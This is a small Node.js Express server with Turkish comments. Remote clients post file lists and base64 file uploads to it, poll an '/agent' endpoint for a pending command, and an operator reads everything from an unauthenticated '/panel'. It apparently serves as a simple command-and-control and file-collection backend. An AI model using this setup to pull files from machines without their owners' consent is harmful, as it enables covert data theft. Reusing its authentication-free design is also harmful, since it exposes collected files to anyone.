const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

let database = {
    fileList: [],
    lastUpdate: null,
    pendingCommand: "IDLE"
};

// ANA SAYFA (Sitenin çalışıp çalışmadığını anlamak için)
app.get('/', (req, res) => {
    res.send("Sunucu aktif! /panel adresine giderek verileri görebilirsin.");
});

// Gelen dosya verisini burada tutacağız
let tempFileStorage = {
    fileName: "",
    data: null // Base64 verisi buraya gelecek
};

// CLIENT DOSYAYI BURAYA YÜKLER
app.post('/upload', (req, res) => {
    tempFileStorage.fileName = req.body.fileName;
    tempFileStorage.data = req.body.data; // Base64 metni
    console.log(`${tempFileStorage.fileName} sunucuya yüklendi.`);
    res.json({ status: "File uploaded to server" });
});

// PANEL DOSYAYI BURADAN ÇEKER
app.get('/download-file', (req, res) => {
    res.json(tempFileStorage);
});

// AGENT KAPISI (Hem GET hem POST destekli yapalım ki hata almayasın)
app.all('/agent', (req, res) => {
    if (req.method === 'POST') {
        console.log("Client'tan veri geldi.");
        if (req.body.files) {
            database.fileList = req.body.files;
            database.lastUpdate = new Date().toLocaleString();
        }
    }
    
    // Her durumda bir cevap dön ki 'Cannot GET' demesin
    res.json({
        status: "Bağlantı Başarılı",
        command: database.pendingCommand
    });
});

// PANEL KAPISI
app.get('/panel', (req, res) => {
    res.json(database);
});

app.listen(PORT, () => {
    console.log(`Server ${PORT} üzerinde çalışıyor.`);
});
